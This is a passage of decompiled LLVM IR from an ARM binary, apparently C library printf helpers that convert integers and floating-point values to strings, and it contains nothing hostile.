  store i1 %v2_14024, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_14024, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_14030 = call i32 @__GI_fseek()
  store i32 %v0_14030, i32* %r0.global-to-local, align 4
  %v2_14034 = icmp eq i32 %v0_14030, 0
  store i1 %v2_14034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14034, label %.dec_label_pc_1403c_crit_edge, label %dec_label_pc_13fe0

.dec_label_pc_1403c_crit_edge:                    ; preds = %dec_label_pc_14024
  %v0_1403c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1403c

dec_label_pc_1403c:                               ; preds = %.dec_label_pc_1403c_crit_edge, %dec_label_pc_14004, %dec_label_pc_1401c
  %v2_1404c = phi i32 [ %v0_1403c.pre, %.dec_label_pc_1403c_crit_edge ], [ %v0_1400c, %dec_label_pc_14004 ], [ %v0_1400c, %dec_label_pc_1401c ]
  %v1_1403c = inttoptr i32 %v2_1404c to i32*
  %v2_1403c = load i32, i32* %v1_1403c, align 4
  store i32 %v2_1403c, i32* %r3.global-to-local, align 4
  %v1_14040 = add i32 %v2_1404c, 8
  %v2_14040 = inttoptr i32 %v1_14040 to i32*
  %v3_14040 = load i32, i32* %v2_14040, align 4
  store i32 %v3_14040, i32* %r1.global-to-local, align 4
  %v1_14044 = and i32 %v2_1403c, -4
  store i32 %v1_14044, i32* %r3.global-to-local, align 4
  %v3_14048 = sdiv i32 %v2_1403c, 256
  store i32 %v3_14048, i32* %r2.global-to-local, align 4
  %v1_1404c = trunc i32 %v3_14048 to i8
  %v3_1404c = add i32 %v2_1404c, 1
  %v4_1404c = inttoptr i32 %v3_1404c to i8*
  store i8 %v1_1404c, i8* %v4_1404c, align 1
  %v0_14050 = load i32, i32* %r1.global-to-local, align 4
  %v1_14050 = load i32, i32* @r4, align 4
  %v2_14050 = add i32 %v1_14050, 20
  %v3_14050 = inttoptr i32 %v2_14050 to i32*
  store i32 %v0_14050, i32* %v3_14050, align 4
  %v0_14054 = load i32, i32* %r3.global-to-local, align 4
  %v1_14054 = trunc i32 %v0_14054 to i8
  %v2_14054 = load i32, i32* @r4, align 4
  %v3_14054 = inttoptr i32 %v2_14054 to i8*
  store i8 %v1_14054, i8* %v3_14054, align 1
  %v0_14058 = load i32, i32* %r1.global-to-local, align 4
  %v1_14058 = load i32, i32* @r4, align 4
  %v2_14058 = add i32 %v1_14058, 24
  %v3_14058 = inttoptr i32 %v2_14058 to i32*
  store i32 %v0_14058, i32* %v3_14058, align 4
  %v0_1405c = load i32, i32* %r1.global-to-local, align 4
  %v1_1405c = load i32, i32* @r4, align 4
  %v2_1405c = add i32 %v1_1405c, 16
  %v3_1405c = inttoptr i32 %v2_1405c to i32*
  store i32 %v0_1405c, i32* %v3_1405c, align 4
  %v0_14060.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14060

dec_label_pc_14060:                               ; preds = %dec_label_pc_13ffc, %dec_label_pc_1403c
  %v2_1406c = phi i32 [ %v0_1400c, %dec_label_pc_13ffc ], [ %v0_14060.pre, %dec_label_pc_1403c ]
  %v1_14060 = inttoptr i32 %v2_1406c to i32*
  %v2_14060 = load i32, i32* %v1_14060, align 4
  %v1_14064 = or i32 %v2_14060, 64
  store i32 %v1_14064, i32* %r2.global-to-local, align 4
  %v3_14068 = sdiv i32 %v2_14060, 256
  store i32 %v3_14068, i32* %r3.global-to-local, align 4
  %v1_1406c = trunc i32 %v3_14068 to i8
  %v3_1406c = add i32 %v2_1406c, 1
  %v4_1406c = inttoptr i32 %v3_1406c to i8*
  store i8 %v1_1406c, i8* %v4_1406c, align 1
  %v0_14070 = load i32, i32* @r4, align 4
  %v1_14070 = add i32 %v0_14070, 1
  %v2_14070 = inttoptr i32 %v1_14070 to i8*
  %v3_14070 = load i8, i8* %v2_14070, align 1
  %v4_14070 = zext i8 %v3_14070 to i32
  %v3_14074 = mul nuw nsw i32 %v4_14070, 256
  store i32 %v3_14074, i32* %r3.global-to-local, align 4
  %v1_14078 = and i32 %v3_14074, 2816
  store i32 %v1_14078, i32* %r0.global-to-local, align 4
  %v2_14078 = icmp eq i32 %v1_14078, 0
  store i1 %v2_14078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14078, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_14060
  %v2_1407c = add i32 %v0_14070, 12
  %v3_1407c = inttoptr i32 %v2_1407c to i32*
  %v4_1407c = load i32, i32* %v3_1407c, align 4
  store i32 %v4_1407c, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_14060
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_14084 = load i32, i32* %r2.global-to-local, align 4
  %v1_14084 = trunc i32 %v0_14084 to i8
  %v3_14084 = inttoptr i32 %v0_14070 to i8*
  store i8 %v1_14084, i8* %v3_14084, align 1
  %v0_14088 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14088, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_14088 = load i32, i32* %r3.global-to-local, align 4
  %v2_14088 = load i32, i32* @r4, align 4
  %v3_14088 = add i32 %v2_14088, 28
  %v4_14088 = inttoptr i32 %v3_14088 to i32*
  store i32 %v1_14088, i32* %v4_14088, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_1408c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1408c, i32* @r4, align 4
  %v8_1408c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_1408c

; uselistorder directives
  uselistorder i32 %v3_14074, { 1, 0 }
  uselistorder i32 %v3_14068, { 1, 0 }
  uselistorder i32 %v3_14048, { 1, 0 }
  uselistorder i32 %v2_1404c, { 0, 2, 1 }
  uselistorder i1 %v2_13ffc, { 1, 0 }
  uselistorder i32 %v3_13fe8, { 1, 0 }
  uselistorder i32 %v3_13fc0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_1400c, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_13fb4, { 1, 0 }
  uselistorder i32 %v5_13f98, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 1024, { 0, 13, 14, 2, 15, 1, 16, 17, 18, 4, 11, 12, 3, 7, 8, 6, 9, 5, 10, 19 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_14060, { 1, 0 }
  uselistorder label %dec_label_pc_1403c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14024, { 1, 0 }
  uselistorder label %dec_label_pc_13fd4, { 1, 0 }
  uselistorder label %dec_label_pc_13fc0, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_14090 = load i32, i32* @r2, align 4
  %v1_14090 = icmp slt i32 %v0_14090, 0
  %v0_14094 = load i32, i32* @r0, align 4
  %v1_14098 = and i32 %v0_14094, 2048
  %v2_140cc = icmp eq i32 %v1_14098, 0
  br i1 %v1_14090, label %dec_label_pc_140cc, label %dec_label_pc_140a0

dec_label_pc_140a0:                               ; preds = %entry
  br i1 %v2_140cc, label %dec_label_pc_140a8, label %dec_label_pc_140d4

dec_label_pc_140a8:                               ; preds = %dec_label_pc_140a0
  %v7_140a8 = icmp eq i32 %v0_14094, 256
  %v0_140ac = load i32, i32* @r1, align 4
  %v1_140ac = inttoptr i32 %v0_140ac to i32*
  %v2_140ac = load i32, i32* %v1_140ac, align 4
  %v2_140b0 = urem i32 %v2_140ac, 256
  %v2_140b0.v2_140ac = select i1 %v7_140a8, i32 %v2_140b0, i32 %v2_140ac
  br i1 %v7_140a8, label %.thread, label %dec_label_pc_140b8

dec_label_pc_140b8:                               ; preds = %dec_label_pc_140a8
  %v7_140b8 = icmp eq i32 %v0_14094, 512
  br i1 %v7_140b8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_140b8
  %v4_140c0 = urem i32 %v2_140b0.v2_140ac, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_140b8, %dec_label_pc_140a8, %bb
  %v1_140c8 = phi i32 [ %v2_140ac, %dec_label_pc_140b8 ], [ %v2_140b0, %dec_label_pc_140a8 ], [ %v4_140c0, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_140c8

dec_label_pc_140cc:                               ; preds = %entry
  br i1 %v2_140cc, label %dec_label_pc_140dc, label %dec_label_pc_140d4

dec_label_pc_140d4:                               ; preds = %dec_label_pc_140a0, %dec_label_pc_140cc
  %v0_140d4 = load i32, i32* @r1, align 4
  %v1_140d4 = inttoptr i32 %v0_140d4 to i32*
  %v2_140d4 = load i32, i32* %v1_140d4, align 4
  %v3_140d4 = add i32 %v0_140d4, 4
  %v4_140d4 = inttoptr i32 %v3_140d4 to i32*
  %v5_140d4 = load i32, i32* %v4_140d4, align 4
  store i32 %v5_140d4, i32* @r1, align 4
  ret i32 %v2_140d4

dec_label_pc_140dc:                               ; preds = %dec_label_pc_140cc
  %v7_140dc = icmp eq i32 %v0_14094, 256
  %v0_140e0 = load i32, i32* @r1, align 4
  %v1_140e0 = inttoptr i32 %v0_140e0 to i32*
  %v2_140e0 = load i32, i32* %v1_140e0, align 4
  %v2_140e4 = urem i32 %v2_140e0, 256
  %v2_140e4.v2_140e0 = select i1 %v7_140dc, i32 %v2_140e4, i32 %v2_140e0
  br i1 %v7_140dc, label %.thread2, label %dec_label_pc_140ec

dec_label_pc_140ec:                               ; preds = %dec_label_pc_140dc
  %v7_140ec = icmp eq i32 %v0_14094, 512
  br i1 %v7_140ec, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_140ec
  %v4_140f0 = mul i32 %v2_140e4.v2_140e0, 65536
  %v4_140f4 = sdiv i32 %v4_140f0, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_140ec, %dec_label_pc_140dc, %bb5
  %v0_140f8 = phi i32 [ %v2_140e0, %dec_label_pc_140ec ], [ %v2_140e4, %dec_label_pc_140dc ], [ %v4_140f4, %bb5 ]
  %v3_140f8 = ashr i32 %v0_140f8, 31
  store i32 %v3_140f8, i32* @r1, align 4
  ret i32 %v0_140f8

; uselistorder directives
  uselistorder i32 %v0_140f8, { 1, 0 }
  uselistorder i32 %v2_140e4, { 1, 0 }
  uselistorder i32 %v2_140e0, { 1, 2, 0 }
  uselistorder i32 %v2_140b0, { 1, 0 }
  uselistorder i32 %v2_140ac, { 1, 2, 0 }
  uselistorder i1 %v2_140cc, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140d4, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_14100 = icmp eq i32 %arg2, 256
  br i1 %v7_14100, label %dec_label_pc_1412c, label %dec_label_pc_14108

dec_label_pc_14108:                               ; preds = %entry
  %v7_14108 = icmp eq i32 %arg2, 2048
  br i1 %v7_14108, label %dec_label_pc_14110, label %dec_label_pc_14118

dec_label_pc_14110:                               ; preds = %dec_label_pc_14108
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_14110 = add i32 %tmp2, 4
  %v6_14110 = inttoptr i32 %v5_14110 to i32*
  store i32 %arg4, i32* %v6_14110, align 4
  ret i32 %tmp2

dec_label_pc_14118:                               ; preds = %dec_label_pc_14108
  %v7_14118 = icmp eq i32 %arg2, 512
  %v4_1411c = sdiv i32 %arg3, 256
  store i32 %v4_1411c, i32* @ip, align 4
  br i1 %v7_14118, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_14118
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_14118
  %v1_14128 = trunc i32 %v4_1411c to i8
  %v4_14128 = add i32 %tmp2, 1
  %v5_14128 = inttoptr i32 %v4_14128 to i8*
  store i8 %v1_14128, i8* %v5_14128, align 1
  br label %dec_label_pc_1412c

dec_label_pc_1412c:                               ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %v4_1411c, { 1, 0 }
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i8* %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1412c, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_14138 = icmp slt i32 %arg4, 0
  %v2_14138 = icmp eq i32 %arg4, 0
  store i1 %v2_14138, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_14138, label %dec_label_pc_14150, label %dec_label_pc_14170

dec_label_pc_14150:                               ; preds = %entry
  %v1_14150 = icmp slt i32 %arg3, 0
  %v2_14150 = icmp eq i32 %arg3, 0
  store i1 %v2_14150, i1* %cpsr_z.global-to-local, align 1
  %v1_14154 = sub i32 0, %arg4
  store i32 %v1_14154, i32* %r7.global-to-local, align 4
  br i1 %v1_14150, label %dec_label_pc_1415c, label %dec_label_pc_14170

dec_label_pc_1415c:                               ; preds = %dec_label_pc_14150
  %v1_14160 = sub i32 0, %arg2
  store i32 %v1_14160, i32* %r5.global-to-local, align 4
  %v2_14160 = icmp eq i32 %arg2, 0
  %v2_14164 = icmp eq i1 %v2_14160, false
  %v5_14164 = sext i1 %v2_14164 to i32
  %v6_14164 = sub i32 %v5_14164, %arg3
  store i32 %v6_14164, i32* %r6.global-to-local, align 4
  %v19_14164 = icmp eq i32 %v6_14164, 0
  store i1 %v19_14164, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14178

dec_label_pc_14170:                               ; preds = %dec_label_pc_14150, %entry
  br label %dec_label_pc_14178

dec_label_pc_14178:                               ; preds = %dec_label_pc_1415c, %dec_label_pc_14170
  %storemerge = phi i8 [ 0, %dec_label_pc_14170 ], [ 1, %dec_label_pc_1415c ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_14180 = load i32, i32* %r7.global-to-local, align 4
  %v2_14188 = udiv i32 -1, %v0_14180
  store i32 %v2_14188, i32* %fp.global-to-local, align 4
  %v2_14198 = urem i32 -1, %v0_14180
  %v1_1419c = add i32 %v2_14198, 1
  store i32 %v1_1419c, i32* %sb.global-to-local, align 4
  %v9_141a0 = icmp eq i32 %v1_1419c, %v0_14180
  store i1 %v9_141a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_141a0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14178
  %v1_141a4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_141a4, i32* %sb.global-to-local, align 4
  %v2_141a8 = add i32 %v2_14188, 1
  store i32 %v2_141a8, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14178, %bb
  %v0_141ac = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_141ac, i32* %sl.global-to-local, align 4
  %v0_141b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_141b0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_141b4

dec_label_pc_141b4thread-pre-split:               ; preds = %bb21
  %v0_141b4.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_141bc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_141b4

dec_label_pc_141b4:                               ; preds = %dec_label_pc_141b4thread-pre-split, %.thread
  %v0_14224 = phi i32 [ %v0_141bc.pre, %dec_label_pc_141b4thread-pre-split ], [ %v0_14180, %.thread ]
  %v0_141d0 = phi i32 [ %v0_141b4.pr, %dec_label_pc_141b4thread-pre-split ], [ %v0_141ac, %.thread ]
  %v2_141b4 = icmp eq i32 %v0_141d0, 0
  store i1 %v2_141b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_141b4, label %dec_label_pc_14220, label %dec_label_pc_141c4

dec_label_pc_141c4:                               ; preds = %dec_label_pc_141b4
  %v2_141c4 = urem i32 %v0_141d0, %v0_14224
  %v2_141d4 = udiv i32 %v0_141d0, %v0_14224
  store i32 %v2_141d4, i32* %sl.global-to-local, align 4
  %v0_141e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_141e4 = urem i32 %v0_141e0, %v0_14224
  %v1_141ec = load i32, i32* %sb.global-to-local, align 4
  %v3_141ec = mul i32 %v1_141ec, %v2_141c4
  %v4_141ec = add i32 %v3_141ec, %v2_141e4
  store i32 %v4_141ec, i32* %r5.global-to-local, align 4
  %v2_141f4 = udiv i32 %v0_141e0, %v0_14224
  %v0_141fc = load i32, i32* %fp.global-to-local, align 4
  %v3_141fc = mul i32 %v0_141fc, %v2_141c4
  %v4_141fc = add i32 %v3_141fc, %v2_141f4
  %v2_14204 = udiv i32 %v4_141ec, %v0_14224
  %v2_1420c = add i32 %v4_141fc, %v2_14204
  br label %dec_label_pc_14240

dec_label_pc_14220:                               ; preds = %dec_label_pc_141b4
  %v0_14220 = load i32, i32* %r6.global-to-local, align 4
  %v2_14238 = udiv i32 %v0_14220, %v0_14224
  br label %dec_label_pc_14240

dec_label_pc_14240:                               ; preds = %dec_label_pc_141c4, %dec_label_pc_14220
  %storemerge24 = phi i32 [ %v2_14238, %dec_label_pc_14220 ], [ %v2_1420c, %dec_label_pc_141c4 ]
  %v0_1425c = phi i32 [ %v2_14238, %dec_label_pc_14220 ], [ %v2_1420c, %dec_label_pc_141c4 ]
  %v1_1425c = phi i32 [ 0, %dec_label_pc_14220 ], [ %v2_141d4, %dec_label_pc_141c4 ]
  %v4_141ec.pn = phi i32 [ %v0_14220, %dec_label_pc_14220 ], [ %v4_141ec, %dec_label_pc_141c4 ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_14248 = urem i32 %v4_141ec.pn, %v0_14224
  %v3_14240 = load i32, i32* %stack_var_0, align 4
  %v2_14244 = icmp ugt i32 %v0_14248, 8
  %v7_14244 = icmp eq i32 %v0_14248, 9
  store i1 %v7_14244, i1* %cpsr_z.global-to-local, align 1
  %v1_1424c = add i32 %v0_14248, 48
  %v0_14254 = load i32, i32* %r8.global-to-local, align 4
  %v1_14254 = add i32 %v0_14254, -1
  store i32 %v1_14254, i32* %r8.global-to-local, align 4
  %v2_14258 = xor i1 %v7_14244, true
  %v3_14258 = and i1 %v2_14244, %v2_14258
  %extract.t = trunc i32 %v1_1424c to i8
  br i1 %v3_14258, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_14240
  %v2_14248 = add i32 %v3_14240, %v0_14248
  %extract.t8 = trunc i32 %v2_14248 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_14240, %bb20
  %v0_14260.off0 = phi i8 [ %extract.t, %dec_label_pc_14240 ], [ %extract.t8, %bb20 ]
  %v2_1425c = or i32 %v0_1425c, %v1_1425c
  %v4_1425c = icmp eq i32 %v2_1425c, 0
  store i1 %v4_1425c, i1* %cpsr_z.global-to-local, align 1
  %v3_14260 = inttoptr i32 %v1_14254 to i8*
  store i8 %v0_14260.off0, i8* %v3_14260, align 1
  %v0_14264 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14264, label %dec_label_pc_14268, label %dec_label_pc_141b4thread-pre-split

dec_label_pc_14268:                               ; preds = %bb21
  %v2_14268 = load i8, i8* %stack_var_-40, align 1
  %v2_1426c = icmp eq i8 %v2_14268, 0
  store i1 %v2_1426c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1426c, label %dec_label_pc_14268..thread2_crit_edge, label %bb22

dec_label_pc_14268..thread2_crit_edge:            ; preds = %dec_label_pc_14268
  %v0_14278.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_14268
  %v3_14274 = load i32, i32* %r8.global-to-local, align 4
  %v4_14274 = add i32 %v3_14274, -1
  %v5_14274 = inttoptr i32 %v4_14274 to i8*
  store i8 45, i8* %v5_14274, align 1
  %v6_14274 = load i32, i32* %r8.global-to-local, align 4
  %v7_14274 = add i32 %v6_14274, -1
  store i32 %v7_14274, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14268..thread2_crit_edge, %bb22
  %v0_14278 = phi i32 [ %v0_14278.pre, %dec_label_pc_14268..thread2_crit_edge ], [ %v7_14274, %bb22 ]
  ret i32 %v0_14278

; uselistorder directives
  uselistorder i32 %v0_14248, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14224, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_14240, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_14178, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp151 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-50 = alloca i8, align 1
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-86 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-85 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14284 = load i32, i32* @r4, align 4
  store i32 %v3_14284, i32* %stack_var_-36, align 4
  %v6_14284 = load i32, i32* @r5, align 4
  %v9_14284 = load i32, i32* @r6, align 4
  %v12_14284 = load i32, i32* @r7, align 4
  %v15_14284 = load i32, i32* @r8, align 4
  %v18_14284 = load i32, i32* @sb, align 4
  %v1_1428c = add i32 %tmp, 8
  %v2_1428c = inttoptr i32 %v1_1428c to i8*
  %v3_1428c = load i8, i8* %v2_1428c, align 1
  %v4_1428c = zext i8 %v3_1428c to i32
  store i32 %v4_1428c, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %fp.global-to-local, align 4
  %v1_14294 = or i32 %v4_1428c, 32
  %v2_14298 = ptrtoint i32* %stack_var_-184 to i32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_1429c = icmp ult i32 %v1_14294, 97
  store i1 %v6_1429c, i1* %cpsr_n.global-to-local, align 1
  %v7_1429c = icmp eq i32 %v1_14294, 97
  store i1 %v7_1429c, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v2_142a8 = load i32, i32* %arg4, align 4
  store i32 %v2_142a8, i32* %r8.global-to-local, align 4
  br i1 %v7_1429c, label %bb, label %bb180

bb:                                               ; preds = %entry
  %v2_142ac = add nuw nsw i32 %v4_1428c, 6
  store i32 %v2_142ac, i32* %r3.global-to-local, align 4
  br label %bb180

bb180:                                            ; preds = %entry, %bb
  %v1_142c0 = phi i32 [ 101, %entry ], [ %v2_142ac, %bb ]
  store i32 %arg2, i32* %stack_var_-192, align 4
  %v1_142b8 = add i32 %tmp, 12
  %v2_142b8 = inttoptr i32 %v1_142b8 to i32*
  %v3_142b8 = load i32, i32* %v2_142b8, align 4
  store i32 %v3_142b8, i32* %r2.global-to-local, align 4
  %v1_142bc = add i32 %tmp, 4
  %v2_142bc = inttoptr i32 %v1_142bc to i32*
  %v3_142bc = load i32, i32* %v2_142bc, align 4
  store i32 %v3_142bc, i32* %r1.global-to-local, align 4
  br i1 %v7_1429c, label %bb181, label %bb182

bb181:                                            ; preds = %bb180
  %v2_142c0 = urem i32 %v1_142c0, 256
  store i32 %v2_142c0, i32* %r7.global-to-local, align 4
  br label %bb182

bb182:                                            ; preds = %bb180, %bb181
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_142c4 = icmp slt i32 %v2_142a8, 0
  store i1 %v1_142c4, i1* %cpsr_n.global-to-local, align 1
  %v2_142c4 = icmp eq i32 %v2_142a8, 0
  store i1 %v2_142c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v1_142c4, label %bb183, label %bb184

bb183:                                            ; preds = %bb182
  store i32 6, i32* %r8.global-to-local, align 4
  br label %bb184

bb184:                                            ; preds = %bb182, %bb183
  %v1_142d0 = and i32 %v3_142b8, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_142d0 = icmp eq i32 %v1_142d0, 0
  store i1 %v2_142d0, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-50, align 1
  store i32 %arg1, i32* %stack_var_-192, align 4
  br i1 %v2_142d0, label %dec_label_pc_142e4, label %dec_label_pc_14354

dec_label_pc_142e4:                               ; preds = %bb184
  %v1_142e4 = urem i32 %v3_142b8, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_142e4 = icmp eq i32 %v1_142e4, 0
  store i1 %v2_142e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142e4, label %.thread10, label %dec_label_pc_14354

dec_label_pc_14354:                               ; preds = %dec_label_pc_142e4, %bb184
  %storemerge = phi i8 [ 43, %bb184 ], [ 32, %dec_label_pc_142e4 ]
  store i8 %storemerge, i8* %stack_var_-50, align 1
  %v2_14358 = add i32 %tmp, 16
  %v3_14358 = inttoptr i32 %v2_14358 to i32*
  store i32 32, i32* %v3_14358, align 4
  %v0_14360 = load i32, i32* %r7.global-to-local, align 4
  %v1_14360 = add i32 %v0_14360, -96
  %v3_14360 = sub i32 95, %v0_14360
  %v4_14360 = and i32 %v3_14360, %v0_14360
  %v5_14360 = icmp slt i32 %v4_14360, 0
  store i1 %v5_14360, i1* %cpsr_v.global-to-local, align 1
  %v6_14360 = icmp slt i32 %v1_14360, 0
  store i1 %v6_14360, i1* %cpsr_n.global-to-local, align 1
  %v7_14360 = icmp eq i32 %v0_14360, 96
  store i1 %v7_14360, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-168, align 4
  %tmp242 = icmp ult i32 %v0_14360, 97
  br i1 %tmp242, label %bb185, label %.thread105

bb185:                                            ; preds = %dec_label_pc_14354
  store i32 12, i32* %r3.global-to-local, align 4
  br label %.thread105

.thread105:                                       ; preds = %dec_label_pc_14354, %bb185
  %v4_14378 = phi i32 [ 12, %bb185 ], [ 3, %dec_label_pc_14354 ]
  %v4_14378..v1_14308 = select i1 %tmp242, i32 %v4_14378, i32 8
